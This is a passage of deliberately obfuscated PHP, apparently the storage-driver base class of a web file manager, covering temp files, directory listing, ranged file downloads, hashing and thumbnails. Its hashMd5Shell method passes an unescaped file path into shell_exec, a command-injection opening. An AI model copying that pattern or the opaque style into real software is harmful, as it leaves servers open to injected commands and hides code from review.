$ì½êö˜„ = TEMP_FILES . rand_string(15) . $_SERVER[³à¼î¯á][8]; @mkdir($ì½êö˜„, DEFAULT_PERRMISSIONS, !0); $åê¢Ïñ = $ì½êö˜„ . $†Ûø¼Í·; @touch($åê¢Ïñ); if ($øòÑ½ ) { file_put_contents($åê¢Ïñ, $øòÑ½ ); } return $åê¢Ïñ; } public function tempFileRemve($ùËí²ö¸) { @unlink($ùËí²ö¸); @rmdir($this->pathFather($ùËí²ö¸)); } public function mkfile($Ö‡×¨¼, $®ãÃıĞ = '', $«ãƒˆ˜í = REPEAT_RENAME) { } public function mkdir($åÃ­ÀòÍ, $éÉÒø‰û = REPEAT_SKIP) { } public function delFile($Ü³—ª¥ ) { } public function delFolder($áº‰ê¬§) { } public function copyFile($Í–ÍÂŠÊ, $±º“Ø»±) { } public function moveFile($ØìË€â, $ò­³Ù§„) { } public function remove($ÌÁüí) { if ($this->isFile($ÌÁüí)) { return $this->delFile($ÌÁüí); } return $this->delFolder($ÌÁüí); } public function rename($óÄ‡Ã‘», $†ÈĞßÅ) { } public function exist($¾‹£Èû) { } public function findByHash($Š·è…å• = '', $ºÈù§º› = '') { return !1; } public function isFile($€¬Ë×ˆ–) { } public function isFolder($¨½§ÕÆÖ) { } public function size($ó¦¸¤Ò) { } public function info($ºÕ¢¾øö) { } public function infoSimple($µü«À´ô) { return $this->info($µü«À´ô); } public function infoAuth($öÖàÕ–ä) { return $this->info($öÖàÕ–ä); } public function infoFull($ÓÈ––¨È) { return $this->info($ÓÈ––¨È); } public function infoFullSimple($…¼±”Ğ) { return $this->info($…¼±”Ğ); } public function infoWithChildren($„Ùµà÷ü) { $ÊÃäãëŞ =& $_SERVER[³à¼î¯á]; static $’²—ú•å = array(); if (isset($’²—ú•å[$„Ùµà÷ü])) { return $’²—ú•å[$„Ùµà÷ü]; } $Šêàí» = $this->info($„Ùµà÷ü); if ($Šêàí» && $Šêàí»[$ÊÃäãëŞ[33]] == $ÊÃäãëŞ[78]) { $ Ç±øÖÉ = array($ÊÃäãëŞ[79] => 0, $ÊÃäãëŞ[80] => 0, $ÊÃäãëŞ[81] => 0); $this->infoChildren($„Ùµà÷ü, $ Ç±øÖÉ); $Šêàí»[$ÊÃäãëŞ[79]] = $ Ç±øÖÉ[$ÊÃäãëŞ[79]]; $Šêàí»[$ÊÃäãëŞ[82]] = array($ÊÃäãëŞ[83] => $ Ç±øÖÉ[$ÊÃäãëŞ[80]], $ÊÃäãëŞ[84] => $ Ç±øÖÉ[$ÊÃäãëŞ[81]]); $’²—ú•å[$„Ùµà÷ü] = $Šêàí»; } return $Šêàí»; } public function listPath($­‘á´£², $‹Ô°ˆ› = false) { } public function has($ì¼Ş¤¡°, $º¶ˆ¬¬ = false, $Ğ‚–Ïíİ = false) { } public function canRead($¬Ã›„Ç™) { } public function canWrite($«¿¹’¡¤) { } public function getContent($´›²Šµı) { } public function setContent($ûŒ®×¦Ñ, $ƒ§ÍÅ…Ñ = '') { } protected function infoChildren($ô¢ƒçƒ„, &$ÅÖ¬º ‹) { $ñ˜ÎÊÊŠ =& $_SERVER[³à¼î¯á]; check_abort_echo(); $à„Ã÷êÎ = $this->listPath($ô¢ƒçƒ„, !0); $à„Ã÷êÎ = array_merge($à„Ã÷êÎ[$ñ˜ÎÊÊŠ[85]], $à„Ã÷êÎ[$ñ˜ÎÊÊŠ[86]]); foreach ($à„Ã÷êÎ as $á–ªë¬å) { if ($á–ªë¬å[$ñ˜ÎÊÊŠ[33]] == $ñ˜ÎÊÊŠ[78]) { $ÅÖ¬º ‹[$ñ˜ÎÊÊŠ[81]]++; $…«Â½îò = $this->getPathInner($á–ªë¬å[$ñ˜ÎÊÊŠ[87]]); $this->infoChildren($…«Â½îò, $ÅÖ¬º ‹); } else { $ÅÖ¬º ‹[$ñ˜ÎÊÊŠ[80]]++; $ÅÖ¬º ‹[$ñ˜ÎÊÊŠ[79]] += $á–ªë¬å[$ñ˜ÎÊÊŠ[79]]; } } } public function fileSubstr($ºãœíë‰, $‹«ÃòéÌ, $›ï×¨îÌ) { } public function listAll($Ü’‰™ìò) { } public function listAllMake($ì“ØÇçÍ, &$úƒÉ¼ñÎ) { $±¼É™  =& $_SERVER[³à¼î¯á]; check_abort_echo(); $îğ“¥Íà = $this->listPath($ì“ØÇçÍ, !0); if (!$îğ“¥Íà) { return; } $áßüß² = array_merge($îğ“¥Íà[$±¼É™ [85]], $îğ“¥Íà[$±¼É™ [86]]); foreach ($áßüß² as $¬Ç¼§ùà) { $İÎ£¬İ = $¬Ç¼§ùà[$±¼É™ [33]] == $±¼É™ [78]; $¹„ÁşÏ½ = array($±¼É™ [87] => $¬Ç¼§ùà[$±¼É™ [87]], $±¼É™ [78] => $İÎ£¬İ); if (isset($¬Ç¼§ùà[$±¼É™ [79]])) { $¹„ÁşÏ½[$±¼É™ [79]] = $¬Ç¼§ùà[$±¼É™ [79]]; } if (isset($¬Ç¼§ùà[$±¼É™ [88]])) { $¹„ÁşÏ½[$±¼É™ [88]] = $¬Ç¼§ùà[$±¼É™ [88]]; } if (!$İÎ£¬İ) { $úƒÉ¼ñÎ[] = $¹„ÁşÏ½; continue; } $úƒÉ¼ñÎ[] = $¹„ÁşÏ½; $Ÿƒ«¾Š… = $¬Ç¼§ùà[$±¼É™ [87]]; $­¶À§Ä = $this->pathDriver; if (substr($¬Ç¼§ùà[$±¼É™ [87]], 0, strlen($­¶À§Ä)) == $­¶À§Ä) { $Ÿƒ«¾Š… = substr($Ÿƒ«¾Š…, strlen($­¶À§Ä)); } $this->listAllMake($Ÿƒ«¾Š…, $úƒÉ¼ñÎ); } } public function listAllSimple($à‡×•¹ñ, $ô˜£®Ãñ = false) { $ñù…¼Ù› = $this->listAll($à‡×•¹ñ); return $this->listAllSimpleMake($ñù…¼Ù›, $this->getPathOuter($à‡×•¹ñ), $ô˜£®Ãñ); } public function listAllSimpleMake($½Ïã¼‹, $×ì”Ôğ, $ç°Æ¾) { $‡ËÓ©  =& $_SERVER[³à¼î¯á]; $ˆ÷›¶ˆ¦ = array(); $×ì”Ôğ = rtrim(get_path_father($×ì”Ôğ), $‡ËÓ© [8]) . $‡ËÓ© [8]; foreach ($½Ïã¼‹ as $À°ÓŞŞç) { $æ™ØòÂó = array($‡ËÓ© [87] => $À°ÓŞŞç[$‡ËÓ© [87]], $‡ËÓ© [89] => $À°ÓŞŞç[$‡ËÓ© [87]], $‡ËÓ© [78] => $À°ÓŞŞç[$‡ËÓ© [78]]); if (isset($À°ÓŞŞç[$‡ËÓ© [79]]) && !$À°ÓŞŞç[$‡ËÓ© [78]]) { $æ™ØòÂó[$‡ËÓ© [79]] = $À°ÓŞŞç[$‡ËÓ© [79]]; } if (isset($À°ÓŞŞç[$‡ËÓ© [88]])) { $æ™ØòÂó[$‡ËÓ© [88]] = $À°ÓŞŞç[$‡ËÓ© [88]]; } if (is_array($À°ÓŞŞç[$‡ËÓ© [90]])) { $æ™ØòÂó[$‡ËÓ© [89]] = $À°ÓŞŞç[$‡ËÓ© [90]][$‡ËÓ© [87]]; $æ™ØòÂó[$‡ËÓ© [79]] = $À°ÓŞŞç[$‡ËÓ© [90]][$‡ËÓ© [79]]; $æ™ØòÂó[$‡ËÓ© [88]] = $À°ÓŞŞç[$‡ËÓ© [90]][$‡ËÓ© [88]]; } else { if (substr($À°ÓŞŞç[$‡ËÓ© [87]], 0, strlen($×ì”Ôğ)) == $×ì”Ôğ) { $æ™ØòÂó[$‡ËÓ© [87]] = substr($À°ÓŞŞç[$‡ËÓ© [87]], strlen($×ì”Ôğ)); } } $Ù÷¾‹ˆ = $À°ÓŞŞç[$‡ËÓ© [78]] ? $‡ËÓ© [8] : $‡ËÓ© [12]; $æ™ØòÂó[$‡ËÓ© [89]] = rtrim($æ™ØòÂó[$‡ËÓ© [89]], $‡ËÓ© [8]) . $Ù÷¾‹ˆ; $æ™ØòÂó[$‡ËÓ© [87]] = $‡ËÓ© [8] . trim($æ™ØòÂó[$‡ËÓ© [87]], $‡ËÓ© [8]) . $Ù÷¾‹ˆ; if (!$ç°Æ¾) { $óÎ€ÖÆË = explode($‡ËÓ© [8], trim($æ™ØòÂó[$‡ËÓ© [87]], $‡ËÓ© [8])); $æ™ØòÂó[$‡ËÓ© [87]] = $‡ËÓ© [8] . implode($‡ËÓ© [8], array_slice($óÎ€ÖÆË, 1)) . $Ù÷¾‹ˆ; } $ˆ÷›¶ˆ¦[] = $æ™ØòÂó; } return array_sort_by($ˆ÷›¶ˆ¦, $‡ËÓ© [87]); } public function upload($ŸÇ‡í©É, $©µ¿í¦ß, $ğçŒº’µ = false, $†¾êà›¢ = REPEAT_REPLACE) { } public function uploadFileByID($ÄÉÔ¬èÀ, $©›€ª€, $×µ™³šØ) { } public function uploadFileByPath($â”ığßÊ, $ºÎğæ€ì, $ßöİÌèŠ = array()) { } public function isUploadServer() { $ü«‘û©Š =& $_SERVER[³à¼î¯á]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ü«‘û©Š[91]) { return !0; } return $GLOBALS[$ü«‘û©Š[6]][$ü«‘û©Š[92]][$ü«‘û©Š[93]]; } public function isFileOutServer() { $Ñíâ•ÙÔ =& $_SERVER[³à¼î¯á]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ñíâ•ÙÔ[91]) { return !0; } return $GLOBALS[$Ñíâ•ÙÔ[6]][$Ñíâ•ÙÔ[92]][$Ñíâ•ÙÔ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Á„á¯ëÓ) { $åÓ‡²£Š =& $_SERVER[³à¼î¯á]; if (!$this->isCdnHost()) { return $Á„á¯ëÓ; } return str_replace(trim(get_url_root($Á„á¯ëÓ), $åÓ‡²£Š[8]), trim($this->cdnHost, $åÓ‡²£Š[8]), $Á„á¯ëÓ); } public function uploadLink($˜¼½€°Î, $–Õè¢Ñğ = 0) { $õñıéœÄ =& $_SERVER[³à¼î¯á]; if ($this->isUploadServer()) { return; } $Ñ–¹™»ï = $this->getType(); if (!in_array($Ñ–¹™»ï, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¾ü¾³¶ = 1024 * 1024 * 10; $Ğ¯‘¬èê = $–Õè¢Ñğ <= $¾ü¾³¶ ? $õñıéœÄ[95] : $õñıéœÄ[96]; $Û¸•–ŸÀ = (!$–Õè¢Ñğ ? 1 : ceil($–Õè¢Ñğ / pow(1024, 3))) * 3600 * 4; $«éñìÂ = $this->{$Ğ¯‘¬èê}($˜¼½€°Î, $Û¸•–ŸÀ); if ($«éñìÂ) { $«éñìÂ[$õñıéœÄ[97]] = $˜¼½€°Î; $«éñìÂ[$õñıéœÄ[98]] = $Ñ–¹™»ï; } return $«éñìÂ; } public function uploadFormData($ù²•ÓÏŠ, $¹«úÓÂÎ = 3600) { } public function multiUploadFormData($ğ¶¯·û„, $æÚ—Ó• = 3600) { } public function download($Â›¶»ÔĞ, $íß¸î‰ğ) { } public function ext($Û™ˆÆ…Ï) { $½ûÀÇ®£ =& $_SERVER[³à¼î¯á]; if (strpos($Û™ˆÆ…Ï, $½ûÀÇ®£[8]) === -1) { $Ò’ÂıØÓ = $Û™ˆÆ…Ï; } else { $Ò’ÂıØÓ = $this->pathThis($Û™ˆÆ…Ï); } $òáÉªö = $½ûÀÇ®£[12]; if (strstr($Ò’ÂıØÓ, $½ûÀÇ®£[10])) { $òáÉªö = substr($Ò’ÂıØÓ, strrpos($Ò’ÂıØÓ, $½ûÀÇ®£[10]) + 1); $òáÉªö = strtolower($òáÉªö); } if (strlen($òáÉªö) > 3 && preg_match($½ûÀÇ®£[99], $òáÉªö, $‰®˜—üÂ)) { $òáÉªö = $½ûÀÇ®£[12]; } return $òáÉªö; } public function pathThis($¾Ì“¥šì) { $ö•òØš =& $_SERVER[³à¼î¯á]; $¾Ì“¥šì = str_replace($ö•òØš[100], $ö•òØš[8], rtrim($¾Ì“¥šì, $ö•òØš[8])); $Š¼Íé¼ = strrpos($¾Ì“¥šì, $ö•òØš[8]); if ($Š¼Íé¼ === !1) { return $¾Ì“¥šì; } return substr($¾Ì“¥šì, $Š¼Íé¼ + 1); } public function pathFather($ ¦ò—„•) { $ÑÇ¦˜ìĞ =& $_SERVER[³à¼î¯á]; $ ¦ò—„• = str_replace($ÑÇ¦˜ìĞ[100], $ÑÇ¦˜ìĞ[8], rtrim($ ¦ò—„•, $ÑÇ¦˜ìĞ[8])); $¢“ ú§ä = strrpos($ ¦ò—„•, $ÑÇ¦˜ìĞ[8]); if ($¢“ ú§ä === !1) { return $ÑÇ¦˜ìĞ[12]; } return substr($ ¦ò—„•, 0, $¢“ ú§ä + 1); } public function hashSimple($Æšóù–) { $ã¥´›¨© =& $_SERVER[³à¼î¯á]; if (!$Æšóù–) { return md5($ã¥´›¨©[12]); } $–·ç‚Æâ = $this->size($Æšóù–); $Å±½Ò…© = 200; $èğïÌşå = 50; if ($–·ç‚Æâ <= $Å±½Ò…© * $èğïÌşå) { return $this->hashMd5($Æšóù–) . $–·ç‚Æâ; } $Ê¥×µƒ¹ = intval($–·ç‚Æâ / $èğïÌşå); $†Ø—¤·Ì = $ã¥´›¨©[12]; for ($˜éõÚøŒ = 0; $˜éõÚøŒ < $èğïÌşå; $˜éõÚøŒ++) { $†Ø—¤·Ì .= $this->fileSubstr($Æšóù–, $Ê¥×µƒ¹ * $˜éõÚøŒ, $Å±½Ò…©); } $†Ø—¤·Ì .= $this->fileSubstr($Æšóù–, $–·ç‚Æâ - $Å±½Ò…©, $Å±½Ò…©); return md5($†Ø—¤·Ì) . $–·ç‚Æâ; } public static $md5Cache = array(); public function hashMd5($–Êë–²) { if (!$–Êë–²) { return md5($_SERVER[³à¼î¯á][12]); } $–Êë–² = $this->iconvSystem($–Êë–²); if (isset(self::$md5Cache[$–Êë–²])) { return self::$md5Cache[$–Êë–²]; } self::$md5Cache[$–Êë–²] = $this->hashMd5Shell($–Êë–²); if (!self::$md5Cache[$–Êë–²]) { self::$md5Cache[$–Êë–²] = @md5_file($–Êë–²); } return self::$md5Cache[$–Êë–²]; } private function hashMd5Shell($¤ù´­¿â) { $ğØ“ª¡ =& $_SERVER[³à¼î¯á]; if (!$¤ù´­¿â) { return md5($ğØ“ª¡[12]); } if (!function_exists($ğØ“ª¡[101])) { return !1; } $ü„ƒ…­  = array($ğØ“ª¡[102], $ğØ“ª¡[103]); $‘¹½õæ = Cache::get($ğØ“ª¡[104]); if (!$‘¹½õæ) { $¹ƒö€Ö = BASIC_PATH . $ğØ“ª¡[105]; $“ğæÊŞ = md5_file($¹ƒö€Ö); $‘¹½õæ = $ğØ“ª¡[106]; foreach ($ü„ƒ…­  as $üï„£·) { $‹÷˜‘ = shell_exec($üï„£· . "\40\42{$¹ƒö€Ö}\42"); if ($‹÷˜‘ && substr(trim($‹÷˜‘), 0, 32) == $“ğæÊŞ) { $‘¹½õæ = $üï„£·; break; } } Cache::set($ğØ“ª¡[104], $‘¹½õæ, 3600); } if ($‘¹½õæ == $ğØ“ª¡[106]) { return !1; } $‹÷˜‘ = shell_exec($‘¹½õæ . "\x20\x22{$¤ù´­¿â}\x22"); $‹÷˜‘ = str_replace($ğØ“ª¡[107], $ğØ“ª¡[12], $‹÷˜‘); return substr($‹÷˜‘, 0, 32); } public function link($şîı¬í) { return $şîı¬í; } public function fileOut($Ğ«´øÒœ, $•ûäØË = false, $ïÎâÒ‹Ï = false, $¶í´¡…ò = '') { $ı©»ÃË =& $_SERVER[³à¼î¯á]; $this->cacheMethod(null, null); if (!$Ğ«´øÒœ || !$this->exist($Ğ«´øÒœ)) { show_json(LNG($ı©»ÃË[108]), !1, $ïÎâÒ‹Ï); } $ÛÏ«ã = $this->getType() == $ı©»ÃË[109]; $Ê°³®È… = $GLOBALS[$ı©»ÃË[6]][$ı©»ÃË[92]][$ı©»ÃË[110]][$ı©»ÃË[111]]; $¿†ÎÉ©Î = (double) $GLOBALS[$ı©»ÃË[6]][$ı©»ÃË[92]][$ı©»ÃË[110]][$ı©»ÃË[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $“ßû˜©® = $this->infoFull($Ğ«´øÒœ); $øõÕÌ¢ï = $“ßû˜©®[$ı©»ÃË[79]]; $‚›áµ“¯ = gmdate($ı©»ÃË[113], $“ßû˜©®[$ı©»ÃË[88]]); $©ŠÍ ÍÉ = $ïÎâÒ‹Ï ? $ïÎâÒ‹Ï : $this->iconvApp($“ßû˜©®[$ı©»ÃË[32]]); $š—©í× = 0; $¾ŞŸÂøã = $øõÕÌ¢ï - 1; $Ì¸³¡ßæ = $this->ext($©ŠÍ ÍÉ); if (in_array($Ì¸³¡ßæ, array($ı©»ÃË[114], $ı©»ÃË[115], $ı©»ÃË[116], $ı©»ÃË[117]))) { $Ì¸³¡ßæ = $ı©»ÃË[118]; } if (in_array($Ì¸³¡ßæ, array($ı©»ÃË[119]))) { $Ì¸³¡ßæ = $ı©»ÃË[120]; } if (!$¶í´¡…ò) { $¶í´¡…ò = md5($‚›áµ“¯ . $øõÕÌ¢ï); } $¶í´¡…ò = $ı©»ÃË[121] . $¶í´¡…ò . $ı©»ÃË[121]; $Øú­¯²¬ = get_file_mime($Ì¸³¡ßæ); $‹øºæ£¹ = !0; $‹øºæ£¹ = isset($_GET[$ı©»ÃË[122]]) ? !1 : !0; if ($•ûäØË === !1 && !mime_support($Øú­¯²¬)) { $Øú­¯²¬ = $ı©»ÃË[123]; } header($ı©»ÃË[124]); header($ı©»ÃË[125] . $Øú­¯²¬); $ç²™‚¹£ = rawurlencode($©ŠÍ ÍÉ); $ç²™‚¹£ = $ı©»ÃË[121] . $ç²™‚¹£ . $ı©»ÃË[126] . $ç²™‚¹£; if ($•ûäØË) { header($ı©»ÃË[127]); header($ı©»ÃË[128] . $ç²™‚¹£); } else { if ($‹øºæ£¹) { header($ı©»ÃË[129] . $ç²™‚¹£); } } header($ı©»ÃË[130] . gmdate($ı©»ÃË[113], time() + 3600 * 24 * 30) . $ı©»ÃË[131]); header($ı©»ÃË[132]); header($ı©»ÃË[133]); header($ı©»ÃË[134]); if (isset($_SERVER[$ı©»ÃË[135]]) && strtotime($_SERVER[$ı©»ÃË[135]]) == $“ßû˜©®[$ı©»ÃË[88]]) { header($ı©»ÃË[136], !0, 304); die; } if (isset($_SERVER[$ı©»ÃË[137]]) && $_SERVER[$ı©»ÃË[137]] == $¶í´¡…ò) { header($ı©»ÃË[138] . $¶í´¡…ò, !0, 304); die; } header($ı©»ÃË[138] . $¶í´¡…ò); header($ı©»ÃË[139] . $‚›áµ“¯ . $ı©»ÃË[131]); header($ı©»ÃË[140] . $©ŠÍ ÍÉ); header($ı©»ÃË[141]); header($ı©»ÃË[142] . $øõÕÌ¢ï); header($ı©»ÃË[143]); Hook::trigger($ı©»ÃË[144], $Ğ«´øÒœ, $øõÕÌ¢ï, $©ŠÍ ÍÉ, $Ì¸³¡ßæ); if (!$•ûäØË && $Ì¸³¡ßæ == $ı©»ÃË[145]) { if ($øõÕÌ¢ï > 1024 * 1024 * 5) { die; } $ê‚ò´ªÛ = $this->getContent($Ğ«´øÒœ); $ê‚ò´ªÛ = Html::clearSVG($ê‚ò´ªÛ); header($ı©»ÃË[146] . strlen($ê‚ò´ªÛ)); echo $ê‚ò´ªÛ; die; } $’ñ‚ò† = strtolower($_SERVER[$ı©»ÃË[147]]); if ($ÛÏ«ã && $’ñ‚ò† && $Ê°³®È…) { if (strstr($’ñ‚ò†, $ı©»ÃË[148])) { header($ı©»ÃË[149] . $Ğ«´øÒœ); } else { if (strstr($’ñ‚ò†, $ı©»ÃË[150])) { header($ı©»ÃË[151] . $Ğ«´øÒœ); } else { if (strstr($’ñ‚ò†, $ı©»ÃË[152])) { header($ı©»ÃË[153] . $Ğ«´øÒœ); } } } if ($¿†ÎÉ©Î) { header($ı©»ÃË[154] . $¿†ÎÉ©Î); } return; } if (isset($_SERVER[$ı©»ÃË[155]])) { if (preg_match($ı©»ÃË[156], $_SERVER[$ı©»ÃË[155]], $¨şº­¼Ş)) { $š—©í× = intval($¨şº­¼Ş[1]); $š—©í× = $š—©í× <= 0 ? 0 : ($š—©í× >= $¾ŞŸÂøã ? $¾ŞŸÂøã : $š—©í×); if (!empty($¨şº­¼Ş[2])) { $­ß§ğæ = intval($¨şº­¼Ş[2]); $¾ŞŸÂøã = $­ß§ğæ < $š—©í× ? $š—©í× : ($­ß§ğæ >= $¾ŞŸÂøã ? $¾ŞŸÂøã : $­ß§ğæ); } } header($ı©»ÃË[157]); header("\x43\x6f\x6e\164\145\x6e\164\x2d\x52\141\156\147\145\72\40\142\x79\x74\x65\x73\40{$š—©í×}\x2d{$¾ŞŸÂøã}\x2f" . $øõÕÌ¢ï); } else { header($ı©»ÃË[158]); } header($ı©»ÃË[159]); $×Š³øãÀ = !0; if ($_SERVER[$ı©»ÃË[160]] == $ı©»ÃË[161] && $øõÕÌ¢ï > 1204 * 1024 * 1024 * 2) { $×Š³øãÀ = !1; } if ($×Š³øãÀ) { header($ı©»ÃË[162] . ($¾ŞŸÂøã - $š—©í× + 1)); } if ($_SERVER[$ı©»ÃË[163]] == $ı©»ÃË[164]) { return; } $ŒçóîÊÍ = 1024 * 100; $Ş­çª›• = 0; if ($¿†ÎÉ©Î) { $Ş­çª›• = intval(1000 * 1000 * ($ŒçóîÊÍ / $¿†ÎÉ©Î)); } while ($š—©í× <= $¾ŞŸÂøã) { $™×§Â¸Ô = timeFloat(); check_abort(); $¶¢“­¯› = $¾ŞŸÂøã - $š—©í× + 1; if ($¶¢“­¯› <= $ŒçóîÊÍ) { $ŒçóîÊÍ = $¶¢“­¯›; } echo $this->fileSubstr($Ğ«´øÒœ, $š—©í×, $ŒçóîÊÍ); $š—©í× += $ŒçóîÊÍ; if ($ŒçóîÊÍ == $¶¢“­¯›) { $š—©í× = $¾ŞŸÂøã + 1; } if ($Ş­çª›•) { $Ø¾ß®ë = intval(1000 * 1000 * (timeFloat() - $™×§Â¸Ô)); $“éÌá… = $Ş­çª›• - $Ø¾ß®ë; if ($“éÌá… > 5) { usleep($“éÌá…); } } } } public function fileOutServer($ƒÏÛ±œ­, $Ù©èƒÙÑ = false, $ÎŸ“¡Ùß = false, $Ş×­—‰á = '') { $this->fileOut($ƒÏÛ±œ­, $Ù©èƒÙÑ, $ÎŸ“¡Ùß, $Ş×­—‰á); } public function fileOutLink($Õõü±»˜) { header($_SERVER[³à¼î¯á][165] . $Õõü±»˜); die; } public function cacheMethod($ÚÙ¿Ò¥›, $„Å…îŞû, $ú¾‡¦Ò = null) { $–¤¾§Âè =& $_SERVER[³à¼î¯á]; static $ÒÏÌğš§ = array(); $Ó”Ü¸Ä– = $„Å…îŞû ? ltrim($this->getPathOuter($„Å…îŞû), $–¤¾§Âè[8]) : $–¤¾§Âè[12]; $½ĞÍ”’– = $–¤¾§Âè[166] . $ÚÙ¿Ò¥› . $–¤¾§Âè[167] . rtrim($Ó”Ü¸Ä–, $–¤¾§Âè[8]); if (is_null($ÚÙ¿Ò¥›)) { $ÒÏÌğš§ = array(); return; } if (is_null($„Å…îŞû)) { foreach ($ÒÏÌğš§ as $½ĞÍ”’– => $¢Ñı¥ß¶) { if (!strstr($½ĞÍ”’–, $–¤¾§Âè[166] . $ÚÙ¿Ò¥› . $–¤¾§Âè[168])) { continue; } unset($ÒÏÌğš§[$½ĞÍ”’–]); } return; } if (!is_null($ú¾‡¦Ò)) { $ÒÏÌğš§[$½ĞÍ”’–] = $ú¾‡¦Ò; return; } $÷ÔªçË = isset($ÒÏÌğš§[$½ĞÍ”’–]) ? $ÒÏÌğš§[$½ĞÍ”’–] : null; if (!is_null($÷ÔªçË)) { return $÷ÔªçË; } $÷ÔªçË = $this->{$ÚÙ¿Ò¥›}($„Å…îŞû); $ÒÏÌğš§[$½ĞÍ”’–] = $÷ÔªçË; return $÷ÔªçË; } public function cacheMethodInfoSet($ôâ¨‹Âš, $ÈÄå“Ã, $ş¨´úå = false) { $ÖÌ²Ñ¾Ã =& $_SERVER[³à¼î¯á]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÖÌ²Ñ¾Ã[169], $ôâ¨‹Âš, $ÈÄå“Ã); $this->cacheMethod($ÖÌ²Ñ¾Ã[170], $ôâ¨‹Âš, $ÈÄå“Ã ? !1 : !0); if (is_array($ş¨´úå)) { $this->cacheMethod($ÖÌ²Ñ¾Ã[171], $ôâ¨‹Âš, $ş¨´úå); } } public function fileOutImage($ãã «Â‰, $è¨€şıÆ = 250) { $½ÊºÚöÔ =& $_SERVER[³à¼î¯á]; set_timeout(); if (substr($ãã «Â‰, 0, 4) == $½ÊºÚöÔ[152]) { $this->fileOutLink($ãã «Â‰); } $µ¼ïëöÔ = $this->info($ãã «Â‰); $¸ÌùÂº = !1; $ÉŠÜ‚æ = isset($GLOBALS[$½ÊºÚöÔ[172]]) ? $GLOBALS[$½ÊºÚöÔ[172]] : array(); if ($ÉŠÜ‚æ && $ÉŠÜ‚æ[$½ÊºÚöÔ[173]] == $µ¼ïëöÔ[$½ÊºÚöÔ[87]]) { $µ¼ïëöÔ = $ÉŠÜ‚æ; $–İ—„ıø = $µ¼ïëöÔ[$½ÊºÚöÔ[174]]; if ($–İ—„ıø && isset($–İ—„ıø[$½ÊºÚöÔ[175]])) { if ($–İ—„ıø[$½ÊºÚöÔ[175]] <= $è¨€şıÆ && $–İ—„ıø[$½ÊºÚöÔ[176]] <= $è¨€şıÆ) { $¸ÌùÂº = !0; } } } if ($µ¼ïëöÔ[$½ÊºÚöÔ[79]] <= 1024 * 50 || $¸ÌùÂº || !function_exists($½ÊºÚöÔ[177]) || $µ¼ïëöÔ[$½ÊºÚöÔ[178]] == $½ÊºÚöÔ[179]) { return $this->fileOut($ãã «Â‰, !1, $µ¼ïëöÔ[$½ÊºÚöÔ[32]]); } $áÀÁşĞÕ = kodIO::hashPath($µ¼ïëöÔ); $şĞƒãµ— = "\143\157\x76\145\x72\137{$áÀÁşĞÕ}\137{$è¨€şıÆ}\x2e\160\156\147"; $½²€ËÃÓ = IO_PATH_SYSTEM_TEMP . $½ÊºÚöÔ[180]; $îìÈÓóö = IO::infoFullSimple($½²€ËÃÓ); $ÃöçÚø = $îìÈÓóö && is_array($îìÈÓóö) ? $îìÈÓóö[$½ÊºÚöÔ[87]] : $½ÊºÚöÔ[12]; if (!$ÃöçÚø) { $ÃöçÚø = IO::mkdir($½²€ËÃÓ); } if ($µ¼ïëöÔ[$½ÊºÚöÔ[181]] == $½ÊºÚöÔ[182] && isset($µ¼ïëöÔ[$½ÊºÚöÔ[183]]) && $µ¼ïëöÔ[$½ÊºÚöÔ[183]] == kodIO::sourceID($ÃöçÚø)) { $°…ˆšàÄ = $µ¼ïëöÔ[$½ÊºÚöÔ[184]]; if ($è¨€şıÆ <= 500) { $ü½ªÂªÀ = preg_replace($½ÊºÚöÔ[185], $½ÊºÚöÔ[186], $µ¼ïëöÔ[$½ÊºÚöÔ[32]]); $°…ˆšàÄ = IO::fileNameExist($ÃöçÚø, $ü½ªÂªÀ); } return IO::fileOut(KodIO::make($°…ˆšàÄ), !1, $µ¼ïëöÔ[$½ÊºÚöÔ[32]]); } $©ÆÎ°™ = IO::fileNameExist($ÃöçÚø, $şĞƒãµ—); if ($©ÆÎ°™) { return IO::fileOut(KodIO::make($©ÆÎ°™), !1, $µ¼ïëöÔ[$½ÊºÚöÔ[32]]); } if ($è¨€şıÆ > 1000) { $this->makeImageCover($ÃöçÚø, $ãã «Â‰, $şĞƒãµ—, $è¨€şıÆ); $this->makeImageCover($ÃöçÚø, $ãã «Â‰, "\x63\157\166\x65\162\137{$áÀÁşĞÕ}\x5f\x32\x35\60\56\x70\x6e\x67", 250); $©ÆÎ°™ = IO::fileNameExist($ÃöçÚø, $şĞƒãµ—); if ($©ÆÎ°™) { return IO::fileOut(KodIO::make($©ÆÎ°™), !1, $µ¼ïëöÔ[$½ÊºÚöÔ[32]]); } die; } $Õ˜¯òõ = Cache::get($şĞƒãµ—); if ($Õ˜¯òõ == $½ÊºÚöÔ[187] || $Õ˜¯òõ == $½ÊºÚöÔ[188]) { echo $Õ˜¯òõ; die; } Cache::set($şĞƒãµ—, $½ÊºÚöÔ[188], 60); $âêì½‚Ï = array($ÃöçÚø, $µ¼ïëöÔ[$½ÊºÚöÔ[87]], $şĞƒãµ—, $è¨€şıÆ); $Œ¸¯Ÿ‚  = $½ÊºÚöÔ[189] . $µ¼ïëöÔ[$½ÊºÚöÔ[79]] . $½ÊºÚöÔ[190] . $şĞƒãµ— . $½ÊºÚöÔ[191] . $µ¼ïëöÔ[$½ÊºÚöÔ[32]] . $½ÊºÚöÔ[192] . $µ¼ïëöÔ[$½ÊºÚöÔ[87]]; TaskQueue::add($½ÊºÚöÔ[193], $âêì½‚Ï, $Œ¸¯Ÿ‚ , $şĞƒãµ—); } public function makeImageCover($Î¡Èïªê, $“Ù×¡´å, $Â”Ê¦‡ñ, $ëê¨­øù) { $şÓ« Á =& $_SERVER[³à¼î¯á]; if (IO::fileNameExist($Î¡Èïªê, $Â”Ê¦‡ñ)) { return $şÓ« Á[194]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Æ¬ıàá‡ = DATA_THUMB . $Â”Ê¦‡ñ; del_file($Æ¬ıàá‡); $Ş†ˆµ•“ = TEMP_FILES . $Â”Ê¦‡ñ; if (!@file_exists($Ş†ˆµ•“)) { $Ş†ˆµ•“ = $this->download($“Ù×¡´å, $Ş†ˆµ•“); } if (!@file_exists($Ş†ˆµ•“)) { return $şÓ« 